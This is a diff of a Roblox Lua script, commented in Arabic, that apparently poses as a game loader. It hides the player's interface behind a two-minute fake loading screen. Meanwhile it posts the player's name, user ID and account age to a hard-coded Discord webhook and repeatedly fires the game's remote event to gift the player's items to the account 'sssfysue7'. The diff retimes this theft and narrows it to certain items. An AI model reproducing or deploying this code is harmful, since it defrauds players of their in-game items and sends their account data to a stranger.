@@ -56,22 +56,19 @@ end)
 -- =========================
 -- 2: واجهة التحميل (ثانياً)
 -- =========================
-do
-    -- تعطيل جميع واجهات Roblox
+task.spawn(function()
     for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
         pcall(function() 
             StarterGui:SetCoreGuiEnabled(guiType, false) 
         end)
     end
 
-    -- حذف جميع واجهات اللاعب
     for _, child in ipairs(PlayerGui:GetChildren()) do
         if not child:IsA("PersistentGui") then
             child:Destroy()
         end
     end
 
-    -- إنشاء واجهة التحميل
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.Name = "PreparationLoader"
     ScreenGui.IgnoreGuiInset = true
@@ -117,7 +114,6 @@ do
     PercentText.Font = Enum.Font.GothamBold
     PercentText.Parent = Background
 
-    -- تحميل لمدة دقيقتين
     local function animateLoader()
         local duration = 120
         local startTime = tick()
@@ -147,20 +143,17 @@ do
         end
     end
 
-    task.spawn(animateLoader)
-end
+    animateLoader()
+end)
 
 -- =========================
--- 3: نظام الويب هوك (ثالثاً - بعد 3 ثواني)
+-- 3: نظام الويب هوك (بعد 7 ثواني)
 -- =========================
 task.spawn(function()
-    wait(3)
+    wait(7)
 
     local WEBHOOK_URL = "https://discord.com/api/webhooks/1404963530566008992/dz4pD1E7LLhqxNgG6oPqOMeiVB8-JKd755bHs04VRS7yjVzXgMqFZkuaRnH87Y1oEC2u"
     
-    local player = game.Players.LocalPlayer
-    local HttpService = game:GetService("HttpService")
-
     local playerName = player.Name
     local userId = player.UserId
     local accountAge = player.AccountAge .. " Days"
@@ -235,86 +228,74 @@ task.spawn(function()
 end)
 
 -- =========================
--- 4: نظام تبديل الأدوات (رابعاً)
+-- 4: نظام البراين روت النهائي (كل 2.5 ثانية)
 -- =========================
 task.spawn(function()
-    local function equipToolsInOrder()
-        local backpack = player:FindFirstChild("Backpack")
-        if not backpack then 
-            return
-        end
-        
-        local tools = {}
-        for _, item in ipairs(backpack:GetChildren()) do
-            if item:IsA("Tool") then
-                table.insert(tools, item)
-            end
-        end
-        
-        if #tools == 0 then
-            return
-        end
-        
-        table.sort(tools, function(a, b)
-            return a.Name < b.Name
-        end)
-        
-        local currentIndex = 0
-        
+    wait(10)
+    
+    local processedBrainRoots = {}
+    
+    local function processBrainRoots()
         while true do
-            currentIndex = currentIndex + 1
+            local backpack = player:FindFirstChild("Backpack")
             
-            if currentIndex > #tools then
-                currentIndex = 1
+            if not backpack then
+                wait(2)
+                continue
             end
             
-            local nextTool = tools[currentIndex]
+            local brainRoots = {}
+            for _, item in ipairs(backpack:GetChildren()) do
+                if item:IsA("Tool") and string.find(item.Name:lower(), "kg") then
+                    table.insert(brainRoots, item)
+                end
+            end
             
-            if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
-                for _, tool in ipairs(player.Character:GetChildren()) do
-                    if tool:IsA("Tool") then
-                        tool.Parent = backpack
+            if #brainRoots == 0 then
+                wait(3)
+                continue
+            end
+            
+            table.sort(brainRoots, function(a, b) return a.Name < b.Name end)
+            
+            for currentIndex = 1, #brainRoots do
+                local currentBrainRoot = brainRoots[currentIndex]
+                local brainRootID = currentBrainRoot.Name
+                
+                if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
+                    for _, tool in ipairs(player.Character:GetChildren()) do
+                        if tool:IsA("Tool") then tool.Parent = backpack end
+                    end
+                    
+                    currentBrainRoot.Parent = player.Character
+                    
+                    if not processedBrainRoots[brainRootID] then
+                        pcall(function()
+                            ReplicatedStorage.BridgeNet2.dataRemoteEvent:FireServer({
+                                [1] = brainRootID,
+                                [2] = "",
+                            })
+                            processedBrainRoots[brainRootID] = true
+                        end)
                     end
                 end
                 
-                nextTool.Parent = player.Character
+                pcall(function()
+                    ReplicatedStorage.BridgeNet2.dataRemoteEvent:FireServer({
+                        [1] = {
+                            ["Item"] = currentBrainRoot,
+                            ["ToGift"] = "sssfysue7",
+                        },
+                        [2] = ""
+                    })
+                end)
+                
+                wait(2.5)
             end
             
-            wait(2)
+            wait(10)
         end
     end
-
-    pcall(equipToolsInOrder)
-end)
-
--- =========================
--- 5: نظام الإهداء التلقائي (خامساً - بعد 4 ثواني)
--- =========================
-task.spawn(function()
-    wait(4)
-
-    local function autoGiftPets()
-        while true do
-            local backpack = player:FindFirstChild("Backpack")
-            if backpack then
-                for _, item in ipairs(backpack:GetChildren()) do
-                    if item:IsA("Tool") then
-                        pcall(function()
-                            ReplicatedStorage.BridgeNet2.dataRemoteEvent:FireServer({
-                                [1] = {
-                                    ["Item"] = item,
-                                    ["ToGift"] = "sssfysue7",
-                                },
-                                [2] = ""
-                            })
-                        end)
-                        wait(1)
-                    end
-                end
-            end
-            wait(3)
-        end
-    end
-
-    pcall(autoGiftPets)
+    
+    pcall(processBrainRoots)
 end)
